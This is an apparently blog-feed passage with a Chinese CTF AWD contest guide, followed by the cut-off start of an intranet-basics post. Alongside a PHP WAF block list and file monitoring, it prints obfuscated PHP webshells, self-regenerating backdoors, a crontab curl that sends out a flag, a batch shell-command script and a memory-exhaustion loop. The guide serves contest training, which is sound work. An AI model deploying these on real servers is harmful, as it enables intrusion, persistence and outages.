&quot;Get&quot; =&gt; $get, &quot;Get2&quot; =&gt; $get2, &quot;Cookie&quot; =&gt; $cookie, &quot;Post&quot; =&gt; $post, &quot;Post2&quot; =&gt; $post2, &quot;File&quot; =&gt; $files);    logging($input);    $pattern = &quot;/select|insert|update|delete|and|or|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;;    $pattern .= &quot;|file_put_contents|fwrite|curl|system|eval|assert|file_get_contents&quot;;    $pattern .= &quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;;    $pattern .= &quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec/i&quot;;}function logging($var) {    global $WAF_log;    $tmp = &quot;\n[&quot; . date(&#39;y-m-d H:i:s&#39;) . &quot;]\n&quot;;    foreach ($var as $k =&gt; $v) {        if (!empty($v)) {            $tmp .= $k . &quot; : &quot; . print_r($v, true);        }    }    file_put_contents($WAF_log . date(&#39;H&#39;, time()), $tmp . &quot;\n\r&quot;, FILE_APPEND);}waf();?&gt;</code></pre><p>在PHP文件里include这个waf即可，要比<a href="http://www.safedog.cn/install_desc_website.html" target="_blank" rel="external">安全狗</a>麻烦点</p><pre><code>安装安全狗https://zhuanlan.zhihu.com/p/25364552</code></pre><p>使用方法：</p><p>(1).将waf.php传到要包含的文档的目录</p><p>(2).在页面中加入防护，有两种做法，根据情况二选一即可：</p><p>a).在所需要防护的页面加入代码</p><pre><code>require_once(&#39;./datawaf.php&#39;);</code></pre><p>就可以做到页面防注入、跨站</p><p>如果想整站防注，就在网站的一个公用文档中，如数据库链接文档config.inc.php中！</p><p>添加require_once(‘waf.php’);来调用本代码</p><p>常用php系统添加文档</p><pre><code>PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2   \config\config_global.phpWordpress   \wp-config.phpMetinfo   \include\head.php</code></pre><p>b).在每个文档最前加上代码</p><p>在php.ini中找到:</p><pre><code>Automatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径;</code></pre><h5 id="有root权限"><a href="#有root权限" class="headerlink" title="有root权限"></a>有root权限</h5><p>那麽，这样就简单了，直接写在配置中。</p><p>vim php.ini</p><p>auto_append_file = “/dir/path/phpwaf.php”</p><p>重启Apache或者php-fpm就能生效了。</p><p>当然也可以写在 .user.ini 或者 .htaccess 中。</p><p>php_value auto_prepend_file “/dir/path/phpwaf.php”</p><h5 id="只有user权限"><a href="#只有user权限" class="headerlink" title="只有user权限"></a>只有user权限</h5><p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p><p>这钟情况又可以用不同的方式包含。</p><p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p><p>如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。</p><pre><code>include(&#39;phpwaf.php&#39;);</code></pre><p>还有一种是替换index.php，也就是讲index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p><p>当然还没完，还要在原phpwaf.php中包含原来的index.php。</p><pre><code>index.php -&gt; index2.phpphpwaf.php -&gt; index.phpinclude(&#39;index2.php&#39;);</code></pre><p>至于你想用哪种方式，看你心情咯，你开心就好。</p><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>文件监控，会将新文件或者当文件被修改时立即恢复</p><pre><code class="python"># -*- coding: utf-8 -*-# @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--# v demo 0.21 修改了备份的webshell会自己坑自己的情况# todo: windows下不支持中文目录#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = {}      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;Special_string = &#39;drops_log&#39;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = {    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),}def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#39;rb&#39;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = {}    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#39;bak&#39;])if __name__ == &#39;__main__&#39;:    print u&#39;---------start------------&#39;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#39;[*] pre work end!&#39;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#39;[*] &#39; + getUnicode(time.ctime())</code></pre><p>上个文档监控的脚本，这个确实给我们帮了大忙，它会检测目录下过去一段时间内是否有文档改动然后备份该文档并将其删除，这里主要用到的命令就是</p><p>find -name ‘*.php’ -mmin -10</p><p>这样就会找出过去10分钟发生改动的文档，我也先试着运行了一下命令，然后就是一大片木马展示在你眼前，当时的心情真是难以言喻，赶紧备份删马，上监控脚本，</p><h3 id="查找常见备份文档"><a href="#查找常见备份文档" class="headerlink" title="查找常见备份文档"></a>查找常见备份文档</h3><pre><code># 例如bak文档find / -name &quot;*.bak&quot;</code></pre><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>可以在机器上利用tcpdump进行流量抓取</p><pre><code class="bash">sudo tcpdump -s 0 port xxxx -w flow.pcap</code></pre><p>追踪下tcp流，溯源</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>tail -f *.log，看日志，不言而喻，抓他们的payload并利用；</p><p>php脚本</p><pre><code class="php">&lt;?phpdate_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;];   //访问者要访问的文件名$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time     =   date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\r\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt;</code></pre><p>一些日志分析工具</p><ol><li>LogForensics 腾讯实验室 <a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">https://security.tencent.com/index.php/opensource/detail/15</a></li><li>北风飘然@金乌网络安全实验室 <a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">http://www.freebuf.com/sectool/126698.html</a></li><li>网络ID为piaox的安全从业人员： <a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">http://www.freebuf.com/sectool/110644.html</a></li><li>网络ID：SecSky <a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">http://www.freebuf.com/sectool/8982.html</a></li><li>网络ID：鬼魅羊羔<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/96675.html</a></li></ol><pre><code># 日志地址/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/</code></pre><h2 id="0x01-攻击"><a href="#0x01-攻击" class="headerlink" title="0x01 攻击"></a>0x01 攻击</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>主机发现可以用httpscan这个工具  ./httpscan.py 10.20.30.0/24 –t 10</p><p>端口扫描用nmap</p><pre><code># 使用httpscan脚本./httpscan.py 172.16.0.0/24 –t 10# masscanmasscan -p 80 172.16.0.0/24# nmapnmap –sn 172.16.0.0/24</code></pre><h3 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h3><p>比赛刚开始拼手速，前面提到了一开始需要先讲本机ssh密码和mysql密码改了，同时队友可以试试其他机器的，万一所有机器的口令密码一样就美滋滋了</p><p>除了系统层面的口令外，还要考虑下web后台口令</p><h3 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h3><p>在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这个是送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）</p><p>将服务器中web目录下载到本地，利用D盾扫描，一般就可以发现预留后门：</p><pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h3 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h3><ul><li>Getshell：<ul><li>官方后门、文件上传</li><li>文件写入、文件包含</li><li>命令注入、反序列化</li><li>Redis写shell</li><li>Mysql写shell</li></ul></li><li>直接读文件：<ul><li>SSRF</li><li>任意文件读取</li><li>XXE</li><li>文件上传</li><li>rce</li><li>文件包含</li><li>Sqli</li></ul></li></ul><p>sql注入一般没有防护（对方部署的waf除外），可以用sqlmap跑，再利用<code>—sql-shell</code>执行<code>select load_file(‘/flag’);</code>即可得到flag，也可以利用<code>into outfile</code>写木马维持权限，但要根据实际情况，可能会遇到权限问题。用sqlmap跑比较耗时，可以利用payload写一个python，自动化进行攻击：</p><p>上传漏洞也可能只是简单的黑名单或者解析漏洞</p><p>文件包含一般可以跨目录读取flag</p><pre><code>def include(host): r=requests. get(url=&quot;http://%s/?t=../../../../../../flag&quot;% host)flags=re. findall(r&#39;^(.+?)&lt;&#39;,r. content)if flags: return flags[e]else:return &quot;error pwn!&quot;</code></pre><p>命令执行</p><p>拿到命令执行漏洞后执行crontab</p><pre><code># 参考# http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;</code></pre><h4 id="非常规一句话"><a href="#非常规一句话" class="headerlink" title="非常规一句话"></a>非常规一句话</h4><p>一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数</p><pre><code class="php">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;连接方式：?2=assert密码：1</code></pre><pre><code class="php">&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e=&#39;($_REQUEST[C])&#39;;@assert($a.$b.$c.$d.$e);?&gt;连接方式：?b=))99(rhC(tseuqeR+lave</code></pre><pre><code class="php">&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&#39;n985de9&#39;];if(isset($s22)){eval($s21($s22));}?&gt;连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0</code></pre><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>不死马，访问后会一直生成.config.php的一句话。解决方案：重启apache或者写个脚本一直kill这个进程</p><pre><code class="php">&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    while(1){        file_put_contents(&#39;./.config.php&#39;,&#39;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&#39;);        system(&#39;chmod 777 .config.php&#39;);        touch(&quot;./.config.php&quot;,mktime(20,15,1,11,28,2016));        usleep(100);        }?&gt;</code></pre><p>这个不死马运行后会删除自己，一直生成一个.config.php，和上面的类似</p><p>tips: <code>.config.php</code> 前面使用一个点，能很好的隐藏文档。</p><pre><code class="php">&lt;?php    set_time_limit(0);     ignore_user_abort(1);     unlink(__FILE__);     while(1){         file_put_contents(&#39;.config.php&#39;,&#39;&lt;?php @eval($_POST[&quot;password&quot;]);?&gt;&#39;);         sleep(5);    }</code></pre><p>素质低的人则会放置一个md5马，比如</p><pre><code>&lt;?phpif(md5($_POST[&#39;pass&#39;])==&#39;e5e47c6c69adcf1e7681a0bb384dfe44&#39;)@eval($_POST[&#39;cmd&#39;]);?&gt;密码Bigbrokesec</code></pre><p>如果素质低的人又很猥琐，像 <a href="https://www.saowen.com/rd/aHR0cDovL2Jsb2cuMTYzLmNvbS9wYXNzdzBhX2QvYmxvZy9zdGF0aWMvMjUwODA3MDYxMjAxNzYxMzExMzg1OTY5MS8=" target="_blank" rel="external">rootrain</a> 这种就是。那就是利用 <code>header</code> ，最后综合起来就是</p><pre><code>&lt;?phpecho &#39;hello&#39;;if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;) if (@$_SERVER[&#39;HTTP_USER_AGENT&#39;] == &#39;flag&#39;){ $test= &#39;flag&#39;;    header(&quot;flag:$test&quot;);}?&gt;</code></pre><p>放进 <code>config.php</code> 效果最好，因为一般很少人去看这个。</p><h4 id="不死马的解决方案"><a href="#不死马的解决方案" class="headerlink" title="不死马的解决方案"></a>不死马的解决方案</h4><p>先查看进程对应的pid，</p><p><code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。再执行以下</p><pre><code class="php">&lt;?phpwhile (1) {    $pid=1234;    @unlink(&#39;config.php&#39;);    exec(&#39;kill -9 $pid&#39;);}?&gt;</code></pre><p>（2）重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文档夹。</p><h4 id="获取flag的方式"><a href="#获取flag的方式" class="headerlink" title="获取flag的方式"></a>获取flag的方式</h4><p>线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。</p><p>最好能写一个批量上传的，结合批量访问。批量访问参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="external">PHP-定时任务</a><br>或者</p><pre><code>#!/bin/bashwhile truedo    flag=$(curl &#39;http://172.16.4.42:800&#39;)    curl --cookie &quot;PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD&quot; --data &quot;key=&quot;${flag} &quot;http://172.16.4.42/index.php/wargame/submit&quot;    sleep 1sdone</code></pre><h3 id="一句话批量（py2-3-通用）"><a href="#一句话批量（py2-3-通用）" class="headerlink" title="一句话批量（py2 3 通用）"></a>一句话批量（py2 3 通用）</h3><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><pre><code># -*- coding:utf-8 -*-import requests# ------------------------------------- CONFIG -----------------------------------# 目标网段ips_suffix = &#39;192.168.1.&#39;ip_first = 103ip_end = 105# 目标协议 http or httpsschema = &#39;http&#39;# shell相对路径path = &#39;/temp/shell.php&#39;# headersheaders = {&#39;USER-AGENT&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#39;}# cookies       直接burp抓到的cookie即可cookie = &#39;PHPSESSID=eooaqev53m4sqft7csm55eh1l5&#39; # burp抓到的cookie替换此处# shell密码shell_pass = &#39;CCcKNiFeee&#39;# 执行的系统命令exec_command = &#39;whoami&#39;# -------------------------------------- parama -------------------------------------cookies = {}cookie = cookie.split(&#39;;&#39;)for one_cookie in cookie:    key,value = one_cookie.split(&#39;=&#39;,1)    cookies[key.strip(&#39; &#39;)] = valuedata = {shell_pass:&#39;system(&quot;{exec_command}&quot;);&#39;.format(exec_command=exec_command)}# -------------------------------------- attrack ------------------------------------for ip in range(ip_first,ip_end+1):    shell_url = schema + &#39;://&#39; + ips_suffix + str(ip) + path    try:        result = requests.post(shell_url,headers=headers,cookies=cookies,data=data,timeout=3).text        print (result)    except:        print (shell_url + &#39;\tTIMEOUT!!!&#39;)</code></pre><h2 id="0x03-一些小tips"><a href="#0x03-一些小tips" class="headerlink" title="0x03 一些小tips"></a>0x03 一些小tips</h2><p>当怀疑某个进程是受到攻击后创建的shell进程，可以分析这个进程是否有socket连接</p><pre><code>netstat -antulp        #查看连接internet的进程ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l        #查看指定进程socket连接数的命令</code></pre><p>类似的可以查看是否有管道连接</p><pre><code>ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l</code></pre><p>如果有连接，kill掉进程</p><p>最后</p><h2 id="0x04-搅屎"><a href="#0x04-搅屎" class="headerlink" title="0x04 搅屎"></a>0x04 搅屎</h2><p>常驻内存之后，进入死循环。</p><p>循环内部是实现无效複製自身并且访问web服务的功能。</p><p>执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。</p><pre><code>&lt;?php    set_time_limit(0);    ignore_user_abort(true);    while(1){        file_put_contents(randstr().&#39;.php&#39;,file_get_content(__FILE__));        file_get_contents(&quot;http://127.0.0.1/&quot;);    }?&gt;</code></pre><h2 id="0x05-Github-项目推荐"><a href="#0x05-Github-项目推荐" class="headerlink" title="0x05 Github 项目推荐"></a>0x05 Github 项目推荐</h2><p><a href="https://github.com/ssooking/CTFDefense" target="_blank" rel="external">CTFDefense</a><br><a href="https://github.com/wupco/weblogger" target="_blank" rel="external">流量分析</a></p><h2 id="0x06-自己搭建AWD环境"><a href="#0x06-自己搭建AWD环境" class="headerlink" title="0x06 自己搭建AWD环境"></a>0x06 自己搭建AWD环境</h2><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="external">https://github.com/zhl2008/awd-platform</a></p><h2 id="0x07-文章推荐："><a href="#0x07-文章推荐：" class="headerlink" title="0x07 文章推荐："></a>0x07 文章推荐：</h2><p>王一航：<a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="external">https://xz.aliyun.com/t/1530/</a></p><p><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd" target="_blank" rel="external">https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603" target="_blank" rel="external">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/" target="_blank" rel="external">https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;初探线下CTF-AWD模式&quot;&gt;&lt;a href=&quot;#初探线下CTF-AWD模式&quot; class=&quot;headerlink&quot; title=&quot;初探线下CTF AWD模式&quot;&gt;&lt;/a&gt;初探线下CTF AWD模式&lt;/h1&gt;&lt;p&gt;祭上大牛的导图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;h
      
    
    </summary>
    
      <category term="CTF" scheme="http://Bigbroke.com/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础知识</title>
    <link href="http://Bigbroke.com/archis/7db24e65/"/>
    <id>http://Bigbroke.com/archis/7db24e65/</id>
    <published>2018-12-02T09:07:15.000Z</published>
    <updated>2019-03-14T15:53:27.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透基础知识"><a href="#内网渗透基础知识" class="headerlink" title="内网渗透基础知识"></a>内网渗透基础知识</h1><p>[TOC]</p><h2 id="0x00-内网概述"><a href="#0x00-内网概述" class="headerlink" title="0x00 内网概述"></a>0x00 内网概述</h2><p>内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。<br>内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、网吧、单位办公网等都属于此类。</p><h2 id="0x01-内网名词"><a href="#0x01-内网名词" class="headerlink" title="0x01 内网名词"></a>0x01 内网名词</h2><p>我们在研究内网的时候，经常会听说一些列如“工作组”、“域”、<br>“域控制器（DC）”、“父域”、“了域”、“域树”、“域森林’和“活动目录（AD）”“DMZ”、“域内权限”等专有名词。那么它们到底指的是什么？又有何区别呢？</p><h2 id="0x02-工作组"><a href="#0x02-工作组" class="headerlink" title="0x02 工作组"></a>0x02 工作组</h2><p>工作组（Work Group），在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981146.7729611.jpg" alt=""></p><h4 id="加入-创建工作组"><a href="#加入-创建工作组" class="headerlink" title="加入/创建工作组"></a>加入/创建工作组</h4><p>右击桌面上的“计算机”，在弹出的菜单出选择“属性”，点击“更改设置”，“更改”，在“计算机名”一栏中键入你想好的名称，在“工作组”一栏中键入你想加入的工作组名称。<br>如果你输入的工作组名称网络中没有，那么相当于新建了一个工作组，当然暂时只有你的电脑在组内。单击“确定”按钮后，Windows提示需要重新启动，重新启动之后，再进入“网络”就可以看到你所加入的工作组成员了。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981817.9860647.jpg" alt=""></p><p>可以更改进入行政部</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981914.547977.jpg" alt=""></p><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><ul><li>只要将工作组名称改动即可。不过在网上别人照样可以访问你的共享资源。你也可以随便加入同一网络上的任何其它工作组。“工作组”就像一个可以自由进入和退出的“社团”，方便同一组的计算机互相访问。</li><li>所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的。</li></ul><h2 id="0x02-域"><a href="#0x02-域" class="headerlink" title="0x02 域"></a>0x02 域</h2><ul><li>域（Domain）是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</li><li>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</li></ul><p>内网渗透的目的就是为了获得域控制器</p><p>安全域划分</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542982192.3827906.jpg" alt=""></p><h3 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h3><p>单域<br>父域，子域<br>域树（tree）<br>域森林（forest）<br>DNS域名服务器</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h4 id="父域与子域"><a href="#父域与子域" class="headerlink" 